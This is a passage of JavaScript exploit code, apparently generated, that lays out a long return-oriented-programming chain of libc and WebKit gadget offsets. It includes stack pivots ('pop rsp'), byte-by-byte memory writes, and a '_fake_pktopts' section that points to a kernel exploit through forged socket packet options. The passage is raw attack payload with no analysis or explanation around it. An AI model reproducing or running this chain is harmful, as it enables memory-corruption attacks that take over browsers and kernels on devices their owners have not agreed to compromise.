libc_base+713278,
ropchain+254032,//L4232
webkit_base+4687784,
libc_base+772328
]);
//L4232:
db([0,0]);
set_gadget(libc_base+768796,);
//L4233:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+254144,//L4236
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4234:
db([4294967280,4294967295]);// -0x10
set_gadget(libc_base+772328,);
//L4236:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+254232,//L4238
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+254248,//L4239
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4238:
db([0,0]);
set_gadget(libc_base+772328,);
//L4239:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+254352,//L4242
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+254336,//L4241
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L4241:
db([0,0]);
set_gadget(libc_base+772328,);
//L4242:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+254424,//L4245
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L4243:
db([2,0]);// 0x2
set_gadget(libc_base+772328,);
//L4245:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+254536,//L4248
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4246:
db([4294967280,4294967295]);// -0x10
set_gadget(libc_base+772328,);
//L4248:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+254624,//L4250
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+254640,//L4251
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4250:
db([0,0]);
set_gadget(libc_base+772328,);
//L4251:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+254784,//L4254
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+254800,//L4255
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+254768,//L4253
webkit_base+4687784,
libc_base+713278
]);
//L4252:
db([1,0]);// 0x1
set_gadget(libc_base+165442,);
//L4253:
db([0,0]);
set_gadget(libc_base+772328,);
//L4254:
db([0,0]);
set_gadget(libc_base+768796,);
//L4255:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+254888,//L4257
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+254904,//L4258
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4257:
db([0,0]);
set_gadget(libc_base+772328,);
//L4258:
db([0,0]);
set_gadgets([
libc_base+229136,//mov al,[rdi]
libc_base+713278,
ropchain+255064,//L4262
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+255016,//L4259
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+255032,//L4260
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4259:
db([0,0]);
set_gadget(libc_base+165442,);
//L4260:
db([0,0]);
set_gadget(libc_base+772328,);
//L4261:
db([24,0]);// 0x18
set_gadget(libc_base+768796,);
//L4262:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+255120,//L4264
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L4264:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+255232,//L4265
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+255264,//L4267
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+255248,//L4266
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4265:
db([0,0]);
set_gadget(libc_base+772328,);
//L4266:
db([0,0]);
set_gadget(libc_base+768796,);
//L4267:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+255424,//L4271
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+255376,//L4268
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+255392,//L4269
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4268:
db([0,0]);
set_gadget(libc_base+165442,);
//L4269:
db([0,0]);
set_gadget(libc_base+772328,);
//L4270:
db([56,0]);// 0x38
set_gadget(libc_base+768796,);
//L4271:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+255528,//L4273
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+255512,//L4272
webkit_base+4687784,
libc_base+772328
]);
//L4272:
db([0,0]);
set_gadget(libc_base+768796,);
//L4273:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L4274:
db([2,0]);// 0x2
set_gadget(libc_base+772328,);
//L4275:
db([2,0]);// 0x2
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+255744,//L4277
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+255760,//L4278
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+255728,//L4276
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4276:
db([0,0]);
set_gadget(libc_base+165442,);
//L4277:
db([0,0]);
set_gadget(libc_base+768796,);
//L4278:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+255840,//L4279
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+255856,//L4280
webkit_base+4687784,
libc_base+165442
]);
//L4279:
db([0,0]);
set_gadget(libc_base+768796,);
//L4280:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+256048,//L4284
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+256000,//L4281
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+256016,//L4282
webkit_base+4687784,
libc_base+845410,//mov rax,rsi
libc_base+713278,
ropchain+256032,//L4283
webkit_base+4687784,
libc_base+713278
]);
//L4281:
db([0,0]);
set_gadget(libc_base+165442,);
//L4282:
db([0,0]);
set_gadget(libc_base+772328,);
//L4283:
db([0,0]);
set_gadget(libc_base+768796,);
//L4284:
db([0,0]);
set_gadgets([
libc_base+765459,//cqo ;idiv rsi
libc_base+713278,
ropchain+256256,//L4287
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+256288,//L4289
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+256224,//L4285
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+256240,//L4286
webkit_base+4687784,
libc_base+845410,//mov rax,rsi
libc_base+713278,
ropchain+256272,//L4288
webkit_base+4687784,
libc_base+713278
]);
//L4285:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L4286:
db([0,0]);
set_gadget(libc_base+165442,);
//L4287:
db([0,0]);
set_gadget(libc_base+772328,);
//L4288:
db([0,0]);
set_gadget(libc_base+768796,);
//L4289:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+256448,//L4293
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+256400,//L4290
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+256416,//L4291
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4290:
db([0,0]);
set_gadget(libc_base+165442,);
//L4291:
db([0,0]);
set_gadget(libc_base+772328,);
//L4292:
db([56,0]);// 0x38
set_gadget(libc_base+768796,);
//L4293:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+256552,//L4295
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+256536,//L4294
webkit_base+4687784,
libc_base+772328
]);
//L4294:
db([0,0]);
set_gadget(libc_base+768796,);
//L4295:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+256648,//L4298
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4296:
db([4294967280,4294967295]);// -0x10
set_gadget(libc_base+772328,);
//L4298:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+256736,//L4300
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+256752,//L4301
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4300:
db([0,0]);
set_gadget(libc_base+772328,);
//L4301:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+256856,//L4304
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+256840,//L4303
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L4303:
db([0,0]);
set_gadget(libc_base+772328,);
//L4304:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+256928,//L4307
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
//L4305:
db([3,0]);// 0x3
set_gadget(libc_base+772328,);
//L4307:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+257040,//L4310
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4308:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L4310:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+257128,//L4312
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+257144,//L4313
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4312:
db([0,0]);
set_gadget(libc_base+772328,);
//L4313:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+257304,//L4315
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+257336,//L4317
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+257288,//L4314
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+257320,//L4316
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4314:
db([0,0]);
set_gadget(libc_base+165442,);
//L4315:
db([0,0]);
set_gadget(libc_base+772328,);
//L4316:
db([0,0]);
set_gadget(libc_base+768796,);
//L4317:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+257416,//L4318
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+257432,//L4319
webkit_base+4687784,
libc_base+165442
]);
//L4318:
db([0,0]);
set_gadget(libc_base+768796,);
//L4319:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+257560,//L4321
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+257576,//L4322
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+257544,//L4320
webkit_base+4687784,
libc_base+165442
]);
//L4320:
db([0,0]);
set_gadget(libc_base+772328,);
//L4321:
db([0,0]);
set_gadget(libc_base+768796,);
//L4322:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+257680,//L4323
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+257696,//L4324
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L4323:
db([0,0]);
set_gadget(libc_base+768796,);
//L4324:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+257816,//L4325
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+257800,//L4326
webkit_base+4687784,
libc_base+768796
]);
//L4326:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L4325:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+257904,//L4328
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+257888,//L4327
webkit_base+4687784,
libc_base+165442
]);
//L4327:
db([0,0]);
set_gadget(libc_base+768796,);
//L4328:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+258008,//L4329
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+258024,//L4330
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L4329:
db([0,0]);
set_gadget(libc_base+768796,);
//L4330:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+258144,//L4331
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+258128,//L4332
webkit_base+4687784,
libc_base+768796
]);
//L4332:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L4331:
db([0,0]);
//_fake_pktopts:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+258216,//L4334
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L4334:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+258280,//L4336
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L4336:
db([0,0]);
set_gadget(libc_base+713278,);
db([272,0]);// 0x110
set_gadgets([
libc_base+207036,
libc_base+768796
]);
//L4337:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L4338:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L4339:
db([25,0]);// 0x19
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L4340:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+258560,//L4343
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4341:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L4343:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+258648,//L4345
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+258664,//L4346
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L4345:
db([0,0]);
set_gadget(libc_base+772328,);
//L4346:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+258824,//L4348
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+258856,//L4350
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+258808,//L4347
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+258840,//L4349
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L4347:
db([0,0]);
set_gadget(libc_base+165442,);
//L4348:
db([0,0]);
set_gadget(libc_base+772328,);
//L4349:
db([0,0]);
set_gadget(libc_base+768796,);
//L4350:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+258952,//L4352
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+258936,//L4351
webkit_base+4687784,
libc_base+165442
]);
//L4351:
db([0,0]);
set_gadget(libc_base+768796,);
//L4352:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L4354:
ropchain+259056,//L4353
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+297248,//L4355
//L4353:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
//L4357:
db([0,0]);
set_gadgets([
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+259168,//L4359
webkit_base+4687784,
libc_base+713278
]);
//L4358:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4359:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+259240,//L4361
webkit_base+4687784,
libc_base+713278
]);
//L4360:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4361:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+259312,//L4363
webkit_base+4687784,
libc_base+713278
]);
//L4362:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4363:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+259384,//L4365
webkit_base+4687784,
libc_base+713278
]);
//L4364:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4365:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+259456,//L4367
webkit_base+4687784,
libc_base+713278
]);
//L4366:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4367:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+259528,//L4369
webkit_base+4687784,
libc_base+713278
]);
//L4368:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4369:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+259600,//L4371
webkit_base+4687784,
libc_base+713278
]);
//L4370:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4371:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+259672,//L4373
webkit_base+4687784,
libc_base+713278
]);
//L4372:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4373:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+259744,//L4375
webkit_base+4687784,
libc_base+713278
]);
//L4374:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4375:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+259816,//L4377
webkit_base+4687784,
libc_base+713278
]);
//L4376:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4377:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+259888,//L4379
webkit_base+4687784,
libc_base+713278
]);
//L4378:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4379:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+259960,//L4381
webkit_base+4687784,
libc_base+713278
]);
//L4380:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4381:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260032,//L4383
webkit_base+4687784,
libc_base+713278
]);
//L4382:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4383:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260104,//L4385
webkit_base+4687784,
libc_base+713278
]);
//L4384:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4385:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260176,//L4387
webkit_base+4687784,
libc_base+713278
]);
//L4386:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4387:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260248,//L4389
webkit_base+4687784,
libc_base+713278
]);
//L4388:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4389:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260320,//L4391
webkit_base+4687784,
libc_base+713278
]);
//L4390:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4391:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260392,//L4393
webkit_base+4687784,
libc_base+713278
]);
//L4392:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4393:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260464,//L4395
webkit_base+4687784,
libc_base+713278
]);
//L4394:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4395:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260536,//L4397
webkit_base+4687784,
libc_base+713278
]);
//L4396:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4397:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260608,//L4399
webkit_base+4687784,
libc_base+713278
]);
//L4398:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4399:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260680,//L4401
webkit_base+4687784,
libc_base+713278
]);
//L4400:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4401:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260752,//L4403
webkit_base+4687784,
libc_base+713278
]);
//L4402:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4403:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260824,//L4405
webkit_base+4687784,
libc_base+713278
]);
//L4404:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4405:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260896,//L4407
webkit_base+4687784,
libc_base+713278
]);
//L4406:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4407:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+260968,//L4409
webkit_base+4687784,
libc_base+713278
]);
//L4408:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4409:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261040,//L4411
webkit_base+4687784,
libc_base+713278
]);
//L4410:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4411:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261112,//L4413
webkit_base+4687784,
libc_base+713278
]);
//L4412:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4413:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261184,//L4415
webkit_base+4687784,
libc_base+713278
]);
//L4414:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4415:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261256,//L4417
webkit_base+4687784,
libc_base+713278
]);
//L4416:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4417:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261328,//L4419
webkit_base+4687784,
libc_base+713278
]);
//L4418:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4419:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261400,//L4421
webkit_base+4687784,
libc_base+713278
]);
//L4420:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4421:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261472,//L4423
webkit_base+4687784,
libc_base+713278
]);
//L4422:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4423:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261544,//L4425
webkit_base+4687784,
libc_base+713278
]);
//L4424:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4425:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261616,//L4427
webkit_base+4687784,
libc_base+713278
]);
//L4426:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4427:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261688,//L4429
webkit_base+4687784,
libc_base+713278
]);
//L4428:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4429:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261760,//L4431
webkit_base+4687784,
libc_base+713278
]);
//L4430:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4431:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261832,//L4433
webkit_base+4687784,
libc_base+713278
]);
//L4432:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4433:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261904,//L4435
webkit_base+4687784,
libc_base+713278
]);
//L4434:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4435:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+261976,//L4437
webkit_base+4687784,
libc_base+713278
]);
//L4436:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4437:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262048,//L4439
webkit_base+4687784,
libc_base+713278
]);
//L4438:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4439:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262120,//L4441
webkit_base+4687784,
libc_base+713278
]);
//L4440:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4441:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262192,//L4443
webkit_base+4687784,
libc_base+713278
]);
//L4442:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4443:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262264,//L4445
webkit_base+4687784,
libc_base+713278
]);
//L4444:
db([1,0]);// 0x1
